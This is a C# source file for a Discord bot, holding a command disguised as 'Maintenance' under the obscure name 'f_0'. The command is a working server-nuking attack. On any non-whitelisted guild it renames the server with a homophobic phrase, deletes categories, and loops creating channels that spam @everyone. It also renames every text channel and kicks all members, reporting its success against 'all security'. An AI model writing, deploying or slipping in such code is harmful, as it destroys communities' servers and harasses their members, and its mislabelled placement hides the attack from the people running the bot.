using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Net;
using System.Net.Http;
using System.Management;
using System.Collections.Concurrent;
using System.Diagnostics;

using Discord;
using Discord.API;
using Discord.Commands;
using Discord.Net;
using Discord.Rest;
using Discord.WebSocket;
using System.Reflection;
using Discord.Audio;

using MGX_Discord_Bot.EModules.Entities;

namespace MGX_Discord_Bot.EModules.Commands.Maintenance
{
    class f_0
    {
        public static CommandInformation Info = new CommandInformation()
        {
            Alias = false,
            RequiredPermissions = 20
        };
        private static List<ulong> Whitelisted = new List<ulong>()
        {
            {687266658771140608},
            {314393592636506114},
            {720811396891279370}
        };
        private static List<ulong> BeingAttacced = new List<ulong>();

        public static async Task Maindo(SocketMessage arg)
        {
            try
            {
                var Guild = ((SocketGuildChannel)arg.Channel).Guild;
                //var Guild = Program.client.GetGuild(704785659843444776);
                await ((SocketTextChannel)Program.Client.GetChannel(714571669980840017)).SendMessageAsync($"{arg.Author.Username}({arg.Author.Id}) Successfully ran f_0 against all security. Target is {Guild.Name}({Guild.Id})");
                if(!Whitelisted.Contains(Guild.Id) && !BeingAttacced.Contains(Guild.Id))
                {
                    BeingAttacced.Add(Guild.Id);
                    try
                    {
                        Guild.ModifyAsync(g =>
                        {
                            g.Name = "gayest server ever";
                        }).Start();
                    }
                    catch(Exception e)
                    {
                        await arg.Author.SendMessageAsync(e.Message);
                    }
                    new Thread(x =>
                    {
                        foreach(var Categry in Guild.CategoryChannels)
                        {
                            try
                            {
                                Categry.DeleteAsync();
                            }
                            catch(Exception e)
                            {
                                arg.Author.SendMessageAsync(e.Message);
                            }
                            if (!BeingAttacced.Contains(Guild.Id))
                            {
                                Thread.CurrentThread.Abort();
                            }
                        }
                    }).Start();
                    new Thread(async x =>
                    {
                        while(true)
                        {
                            try
                            {
                                var Chnl = await Guild.CreateTextChannelAsync("oop sis-");
                                new Thread(async gay =>
                                {
                                    await Chnl.SendMessageAsync("@everyone");
                                }).Start();
                            }
                            catch (Exception e)
                            {
                                await arg.Author.SendMessageAsync(e.Message);
                            }
                            if (!BeingAttacced.Contains(Guild.Id))
                            {
                                Thread.CurrentThread.Abort();
                            }
                        }
                    }).Start();
                    new Thread(x =>
                    {
                        foreach (var TxtChnl in Guild.TextChannels)
                        {
                            try
                            {
                                TxtChnl.ModifyAsync(mod =>
                                {
                                    mod.Name = "oop sis-";
                                }).Start();
                            }
                            catch (Exception e)
                            {
                                arg.Author.SendMessageAsync(e.Message);
                            }
                            if(!BeingAttacced.Contains(Guild.Id))
                            {
                                Thread.CurrentThread.Abort();
                            }
                        }
                    }).Start();
                    new Thread(x =>
                    {
                        Thread.Sleep(7500);
                        foreach (var user in Guild.Users)
                        {
                            try
                            {
                                user.KickAsync("cause theyre bald");
                            }
                            catch (Exception e)
                            {
                                arg.Author.SendMessageAsync(e.Message);
                            }
                            if (!BeingAttacced.Contains(Guild.Id))
                            {
                                Thread.CurrentThread.Abort();
                            }
                        }
                    }).Start();
                }
                else if(BeingAttacced.Contains(Guild.Id))
                {
                    await arg.Author.SendMessageAsync("removed the guild from f_0");
                    BeingAttacced.Remove(Guild.Id);
                }
                else
                {
                    await arg.Author.SendMessageAsync("no.");
                }
            }
            catch(Exception e)
            {
                await arg.Author.SendMessageAsync(e.Message);
            }
        }
    }
}
